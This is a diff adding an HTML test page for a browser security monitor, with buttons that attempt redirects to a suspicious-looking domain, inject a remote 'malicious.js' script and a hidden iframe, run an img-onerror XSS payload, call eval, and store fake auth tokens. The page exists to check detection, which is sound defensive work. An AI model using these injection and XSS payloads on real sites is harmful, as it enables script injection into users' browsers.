@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Test Page</title>
+    <style>
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem;
+            line-height: 1.6;
+        }
+        h1 {
+            border-bottom: 2px solid #eee;
+            padding-bottom: 0.5rem;
+        }
+        .test-section {
+            margin-bottom: 2rem;
+            padding: 1rem;
+            border: 1px solid #eee;
+            border-radius: 0.5rem;
+        }
+        button {
+            padding: 0.5rem 1rem;
+            background: #2563eb;
+            color: white;
+            border: none;
+            border-radius: 0.25rem;
+            cursor: pointer;
+            margin-right: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+        button:hover {
+            background: #1d4ed8;
+        }
+        .result {
+            margin-top: 1rem;
+            padding: 1rem;
+            background: #f9fafb;
+            border-radius: 0.25rem;
+            white-space: pre-wrap;
+        }
+        .success {
+            color: #059669;
+        }
+        .error {
+            color: #dc2626;
+        }
+    </style>
+</head>
+<body>
+    <h1>Security Monitor Test Page</h1>
+    <p>This page contains tests for the application's security monitoring system. It attempts various suspicious operations that should be detected and blocked by the security monitoring in place.</p>
+    <p><strong>Note:</strong> If security monitoring is working correctly, most of these tests will fail to execute completely, which is the desired behavior.</p>
+
+    <div class="test-section">
+        <h2>1. Redirect Tests</h2>
+        <button onclick="testWindowLocationRedirect()">Test window.location Redirect</button>
+        <button onclick="testLocationHrefRedirect()">Test location.href Redirect</button>
+        <button onclick="testLocationReplaceRedirect()">Test location.replace Redirect</button>
+        <button onclick="testHistoryPushStateRedirect()">Test history.pushState Redirect</button>
+        <div id="redirect-result" class="result"></div>
+    </div>
+
+    <div class="test-section">
+        <h2>2. DOM Injection Tests</h2>
+        <button onclick="testScriptInjection()">Inject External Script</button>
+        <button onclick="testIframeInjection()">Inject Iframe</button>
+        <button onclick="testInlineScriptInjection()">Inject Inline Script</button>
+        <div id="dom-result" class="result"></div>
+    </div>
+
+    <div class="test-section">
+        <h2>3. Eval and Code Execution Tests</h2>
+        <button onclick="testEval()">Test eval()</button>
+        <button onclick="testFunction()">Test Function constructor</button>
+        <button onclick="testDocumentWrite()">Test document.write()</button>
+        <div id="eval-result" class="result"></div>
+    </div>
+
+    <div class="test-section">
+        <h2>4. Data Storage Tests</h2>
+        <button onclick="testLocalStorageToken()">Set Auth Token in localStorage</button>
+        <button onclick="testSessionStorageToken()">Set Auth Token in sessionStorage</button>
+        <div id="storage-result" class="result"></div>
+    </div>
+
+    <div class="test-section">
+        <h2>5. Network Request Tests</h2>
+        <button onclick="testExternalFetch()">Fetch External Domain</button>
+        <button onclick="testSuspiciousFetch()">Fetch Suspicious Domain</button>
+        <div id="network-result" class="result"></div>
+    </div>
+
+    <script>
+        // Helper functions
+        function logResult(elementId, message, isError = false) {
+            const resultElement = document.getElementById(elementId);
+            const logEntry = document.createElement('div');
+            logEntry.classList.add(isError ? 'error' : 'success');
+            logEntry.textContent = `${new Date().toLocaleTimeString()}: ${message}`;
+            resultElement.prepend(logEntry);
+        }
+
+        // 1. Redirect Tests
+        function testWindowLocationRedirect() {
+            try {
+                const original = window.location.href;
+                // Try to redirect to a suspicious domain
+                setTimeout(() => {
+                    try {
+                        window.location = 'http://coaufu.com';
+                        // This should not execute if security monitoring is working
+                        logResult('redirect-result', 'Warning: window.location redirect was not blocked!', true);
+                    } catch (e) {
+                        logResult('redirect-result', `window.location redirect blocked: ${e.message}`);
+                    }
+                }, 100);
+                logResult('redirect-result', 'Attempted window.location redirect');
+            } catch (e) {
+                logResult('redirect-result', `Error: ${e.message}`, true);
+            }
+        }
+
+        function testLocationHrefRedirect() {
+            try {
+                setTimeout(() => {
+                    try {
+                        window.location.href = 'http://coaufu.com';
+                        logResult('redirect-result', 'Warning: location.href redirect was not blocked!', true);
+                    } catch (e) {
+                        logResult('redirect-result', `location.href redirect blocked: ${e.message}`);
+                    }
+                }, 100);
+                logResult('redirect-result', 'Attempted location.href redirect');
+            } catch (e) {
+                logResult('redirect-result', `Error: ${e.message}`, true);
+            }
+        }
+
+        function testLocationReplaceRedirect() {
+            try {
+                setTimeout(() => {
+                    try {
+                        window.location.replace('http://coaufu.com');
+                        logResult('redirect-result', 'Warning: location.replace redirect was not blocked!', true);
+                    } catch (e) {
+                        logResult('redirect-result', `location.replace redirect blocked: ${e.message}`);
+                    }
+                }, 100);
+                logResult('redirect-result', 'Attempted location.replace redirect');
+            } catch (e) {
+                logResult('redirect-result', `Error: ${e.message}`, true);
+            }
+        }
+
+        function testHistoryPushStateRedirect() {
+            try {
+                const originalPushState = history.pushState;
+                history.pushState({}, '', 'http://coaufu.com');
+                if (window.location.href.includes('coaufu.com')) {
+                    logResult('redirect-result', 'Warning: history.pushState redirect was not blocked!', true);
+                } else {
+                    logResult('redirect-result', 'history.pushState redirect was blocked');
+                }
+            } catch (e) {
+                logResult('redirect-result', `Error or blocked: ${e.message}`);
+            }
+        }
+
+        // 2. DOM Injection Tests
+        function testScriptInjection() {
+            try {
+                const script = document.createElement('script');
+                script.src = 'http://coaufu.com/malicious.js';
+                document.body.appendChild(script);
+                logResult('dom-result', 'Attempted to inject external script');
+                setTimeout(() => {
+                    if (document.body.contains(script)) {
+                        logResult('dom-result', 'Warning: External script injection was not blocked!', true);
+                    } else {
+                        logResult('dom-result', 'External script was removed by security monitor');
+                    }
+                }, 500);
+            } catch (e) {
+                logResult('dom-result', `Error: ${e.message}`, true);
+            }
+        }
+
+        function testIframeInjection() {
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.src = 'http://coaufu.com';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                logResult('dom-result', 'Attempted to inject iframe');
+                setTimeout(() => {
+                    if (document.body.contains(iframe)) {
+                        logResult('dom-result', 'Warning: Iframe injection was not blocked!', true);
+                    } else {
+                        logResult('dom-result', 'Iframe was removed by security monitor');
+                    }
+                }, 500);
+            } catch (e) {
+                logResult('dom-result', `Error: ${e.message}`, true);
+            }
+        }
+
+        function testInlineScriptInjection() {
+            try {
+                const div = document.createElement('div');
+                div.innerHTML = '<img src="x" onerror="javascript:alert(\'XSS\')">';
+                document.body.appendChild(div);
+                logResult('dom-result', 'Attempted to inject inline script');
+                setTimeout(() => {
+                    if (document.body.contains(div) && div.innerHTML.includes('onerror')) {
+                        logResult('dom-result', 'Warning: Inline script injection was not blocked!', true);
+                    } else {
+                        logResult('dom-result', 'Inline script was sanitized by security monitor');
+                    }
+                }, 500);
+            } catch (e) {
+                logResult('dom-result', `Error: ${e.message}`, true);
+            }
+        }
+
+        // 3. Eval and Code Execution Tests
+        function testEval() {
+            try {
+                eval('console.log("This is an eval test")');
+                logResult('eval-result', 'eval() was executed but should have been detected');
+            } catch (e) {
+                logResult('eval-result', `Error or blocked: ${e.message}`);
+            }
+        }
+
+        function testFunction() {
+            try {
+                const dynamicFunc = new Function('return "This is a dynamic function test"');
+                const result = dynamicFunc();
+                logResult('eval-result', `Function constructor was executed: ${result}`);
+            } catch (e) {
+                logResult('eval-result', `Error or blocked: ${e.message}`);
+            }
+        }
+
+        function testDocumentWrite() {
+            try {
+                const original = document.write;
+                document.write('<p>This is a document.write test</p>');
+                logResult('eval-result', 'document.write() was executed but should have been detected');
+            } catch (e) {
+                logResult('eval-result', `Error or blocked: ${e.message}`);
+            }
+        }
+
+        // 4. Data Storage Tests
+        function testLocalStorageToken() {
+            try {
+                localStorage.setItem('auth_token', 'fake-jwt-token-for-testing');
+                logResult('storage-result', 'Set auth_token in localStorage (should be detected)');
+            } catch (e) {
+                logResult('storage-result', `Error: ${e.message}`, true);
+            }
+        }
+
+        function testSessionStorageToken() {
+            try {
+                sessionStorage.setItem('session_token', 'fake-session-token-for-testing');
+                logResult('storage-result', 'Set session_token in sessionStorage (should be detected)');
+            } catch (e) {
+                logResult('storage-result', `Error: ${e.message}`, true);
+            }
+        }
+
+        // 5. Network Request Tests
+        function testExternalFetch() {
+            try {
+                fetch('https://example.com')
+                    .then(response => {
+                        logResult('network-result', 'External fetch completed (may be allowed depending on security policy)');
+                    })
+                    .catch(error => {
+                        logResult('network-result', `External fetch failed: ${error}`, true);
+                    });
+                logResult('network-result', 'Attempted external fetch request');
+            } catch (e) {
+                logResult('network-result', `Error: ${e.message}`, true);
+            }
+        }
+
+        function testSuspiciousFetch() {
+            try {
+                fetch('http://coaufu.com/api')
+                    .then(response => {
+                        logResult('network-result', 'Warning: Suspicious fetch completed!', true);
+                    })
+                    .catch(error => {
+                        logResult('network-result', `Suspicious fetch blocked or failed: ${error}`);
+                    });
+                logResult('network-result', 'Attempted suspicious fetch request');
+            } catch (e) {
+                logResult('network-result', `Error or blocked: ${e.message}`);
+            }
+        }
+    </script>
+</body>
+</html>
